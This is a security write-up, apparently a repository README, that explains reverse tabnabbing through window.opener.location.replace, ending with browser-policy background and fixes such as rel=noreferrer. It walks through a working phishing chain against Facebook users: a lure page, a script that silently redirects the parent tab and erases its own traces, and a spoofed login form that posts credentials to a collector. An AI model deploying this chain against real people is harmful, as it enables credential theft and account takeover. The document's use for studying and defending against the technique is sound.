# Javascript window.opener.location.replace 

**DISCLAIMER**

#### THIS ARTICLE IS INTENDED FOR EDUCATIONAL PURPOSE **ONLY**.
#### I will not be responsible for any action performed by any reader. If you plan to use the content for illegal purposes, be aware that you can and will be held accountable by the law!

This post discusses a technique of phishing that is applicable to any web site, using an exploit deeply embedded inside the Javascript programming language itself.
Arguably, this exploit is not perceived as a bug, as it is a willing design decission of all major browsers, though the security problems it can pose seem ignored 
and hugely misunderstood.

In Javascript, when a window opens a new windows, the newly opened window (or child window) contains a property named [opener](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener)
that serves as a reference to the original, parent window. Why is this? Because, providing it does not violate the [Same-Origin Policy](https://en.wikipedia.org/wiki/Same-origin_policy) 
security restrictions, the child window is able to access the parent window through this property.

Being a reference to a window, the opener contains the same methods any window does, and this means that a by-product of offering a reference to the parent window is 
to "inherit" other side-effects, such as the ability to invoke [location.replace()](http://www.w3schools.com/jsref/met_loc_replace.asp), a method used to navigate windows.
As the name of the method implies, it replaces the current location with a new URL, regardless of the of the fact of both windows being of same origin or not!

In other words, a parent window A can open a child window B, that holds a reference to the parent window A, and can change the location of this parent window, in the background,
through the said reference, without any indication or alerting of the user.


### Practical example

Let's try and create a phishing version of a social media platform, the almighty Facebook. 

We all know that the external links posted on this platform, or sent in its chat open new windows when clicked. 
So, the first thing that we need is a page we can post or send as a chat message, so that we have a link created automatically towards it,
that will open it when clicked. I will name this page `page1.html` and the code I need to place in its source code is this:

```html
<!DOCTYPE html>
<html>
	<head>
		<meta property="og:title" content="some title"/>
		<meta name="og:description" content="some description"/>
		<meta property="og:image" content="some URL to an online image"/>
	</head>
	<body>
		<a onclick="window.open('page2.html', '_blank');" href="#">
			Some test link
		</a>
	</body>
</html>
```

From the above code, nothing much to gather: simple html page, with a link triggering some javascript code when clicked. The javascript portion is important, because
`window.opener` ONLY gets populated if the child window was opened with the `window.open` javascript function (it will otherwise be null, and the whole system won't work).

In order for Facebook to render a nice preview of the link we are about to post, I added some extra meta properties in the header, these are sometimes used to generate a small
link preview when posting the link. However, these are used only for the sole purpose of making it more realistic, and they do not have any practical effect.

As you can see from the above code, when the link is clicked, it opens a new page named `page2.html`. These are the codes of this page:

```html
<html>
	<body>
		<script>
			if (window.opener) 
				window.opener.location.replace('page3.html');
			else 
			{
				// alert('window.opener is null');
				document.body.innerHTML = '';
			}
			window.location.href = "http:// some url to an article you're sending/";
		</script>
	</body>
</html>
```

This page is just as simple: an empty page that contains a simple javascript code that does all the magic: first, we check if the window.opener object is `null`, 
and if it is, we display some error message and replace the html of the web page with nothing, an empty string (so as to leave no trace of the original script, if inspected).

If it's not `null` and it references the parent window, we *MODIFY THE LOCATION OF THE PARENT WINDOW* to a new page, named `page3.html`, but keep in mind that we are 
redirecting the parent window to the new location *AFTER* the child window has been opened and displayed. In other words, when the user clicks on the link in `page1.html`,
all they see is `page2.html` opening, but they do not notice that `page1.html` has been redirected to `page3.html` in the background, without any notification, alert, etc.
You might get a glimpse of the spinning wheel that signals the loading of a new page, for a split second, if you are fast enough, but that's about all the "warning" you will get.

Now, after redirecting `page1.html` to `page3.html`, `page2.html` continues with the script execution: `window.location.href = "http:// some url to an article you're sending/";`
That line of code just instantly redirects the `page2.html` page to some URL on the web, so that it appears that the user really opened that article we posted. Except that,
when they finish reading the article and close that tab in order to return to facebook.com, the tab actually displays `page3.html`, which can be a spoofed version of the Facebook login
page, demanding that "your credentials have expired, please re-enter your password". Obviously, most people will think nothing of it, who of you actually inspects a SSL certificate
before entering their password? 

The codes for `page3.html` could look something like this:

```html
<!DOCTYPE html>
<html>
	<body>
		<FORM METHOD="POST" ACTION="page4.php">
			<input type="text" id="email">
			<input type="password" id="pass">
			<input type="button"> 
		</FORM>
	</body>
</html>
```

Of course, the style of the page needs to be much more complex, to look precisely like the page you're phishing, but I've posted only the crucial part that displays the input 
fields and the button for submitting them to the `page4.php` file. In the current repository, the `page3.html` file includes all the original styling.

As already explained, `page3.html`'s role is to just display two fields for asking the username and the password of the user, and a button for submitting them to another page,
where we can store them in a database, for example. After the user submits their credentials, the page could simply just redirect to the real facebook.com, and 
since most people store their credentials in their browsers, it would appear to them that they really re-logged in.

Another note-worthy point is that the opener object DOES NOT get stored in the navigation stack of the browser. So, even if the user were to click the Back button, they would not be 
taken to the spoofed login page, because it is not stored in the navigation history.

For completeness, `page4.php` is also included in the current repository, but I do not discuss about its inner workings.

### Why it works?

Well, how about Same-Origin Policy? Isn't it supposed to protect us from it?
Long story short, NO. The general idea behind Same-Origin Policy is that scripts from different origin running in a frame or a tab cannot manipulate content 
in another frame or tab. By "manipulating content" it means it cannot read elements from the DOM of another tab or frame, or write into them.

This side effect exploit comes from a different, little known policy: Frame Navigation Policies.

Navigation policies come in a variety of forms and their implementation vary depending on the browser. Older browsers, like Internet Explorer 6, implement a 
very permissive policy, where any frame from any origin can navigate every other frame within the browser. This means that any page hosted by attacker.com can 
navigate frames within confidential.com. This attack was known as [Cross-Window Attack](https://www.usenix.org/legacy/event/sec08/tech/full_papers/barth/barth_html/index.html)
 and was initially published by [Georgi Guninski](https://bugzilla.mozilla.org/show_bug.cgi?id=13871) in 1999.
In response to Cross-Window attacks, other slightly more locked down policies were implemented, but they also had their own shortcomings. For example, 
one of the proposed policy could mitigate Cross-Window Attacks, but if the frame was loaded from the same window (a common practice in the world of web 2.0), 
it was still able to navigate the top frame.

Other stricter policies are Descendant Policy, and Child Policy, where a frame can navigate only its direct children.
HTML5 security specification related to frame navigation is quite frankly ambiguous, and not clearly defined. It is definitely not the permissive one, 
but it seems like Descendent and Child were not strictly adhered to either, and the security specs document of HTML5 is full of very confusing wording.

Quoting the commentary 12 of ticket #168988:

*`For the record, it looks like the spec’s wording has changed and now allows cross-origin openers to be navigated. Here’s an updated quote 
from https://html.spec.whatwg.org/#allowed-to-navigate: “A browsing context A is allowed to navigate a second browsing context B if the 
following algorithm terminates positively: If A is not the same browsing context as B, and A is not one of the ancestor browsing contexts 
of B, and B is not a top-level browsing context, and A’s active document’s active sandboxing flag set has its sandboxed navigation browsing 
context flag set, then abort these steps negatively. Otherwise, if B is a top-level browsing context, and is one of the ancestor browsing 
contexts of A, and A’s node document’s active sandboxing flag set has its sandboxed top-level navigation browsing context flag set, 
then abort these steps negatively. Otherwise, if B is a top-level browsing context, and is neither A nor one of the ancestor browsing 
contexts of A, and A’s Document’s active sandboxing flag set has its sandboxed navigation browsing context flag set, and A is not the one 
permitted sandboxed navigator of B, then abort these steps negatively. Otherwise, terminate positively!” The spec now defaults to allowing 
the navigation, which seems to be consistent with existing browser behavior. I’m not opposed to seeing that changed, but someone would have 
to find the time to measure the compatibility impact.`*

According to the comment, Cross-Origin Openers can be navigated by the child. This is why the above exploit works.

### Current status of exploit

Reading tickets from Chrome, it seems like overall consensus of Chromium developers is that the issue with `window.opener.location.replace()` is not 
a big deal - it is even marked as WONT_FIX in one of the tickets.
Quoting the 5th comment of ticket [#429395](https://code.google.com/p/chromium/issues/detail?id=429395):

*`Given this, I don’t see any risk to users more than the users just clicking on a link and visiting a new page, so I am closing with WontFix.`*

I personally strongly disagree with that statement. Since there's no visual impact to the UI indicators, such as URL bar of the navigated site, even the most 
tech-savvy user will never expect the original tab to be redirected elsewhere. In my opinion this dramatically increases the likelihood of successful phishing attacks. 

### Hot to fix

First of all, good news for protecting youselves: the above exploit only works when directly left-clicking on the link. If the user righ clicks on the link and choses "Open in new tab" 
from the menu that appears, the script will fail to run. 

Second, for protecting the others, for those that know their way around coding and have access to the source code, you can always
just manually set the `window.opener` object to null. In HTML5 supported browsers, when using the anchor tag and `"_blank"`, by adding `"rel=noreferrer"` 
it automatically destroys the 'opener' property of the new tab.

Written for **#cyber-security** Discord channel by [LadyYulia](https://github.com/rusoaica).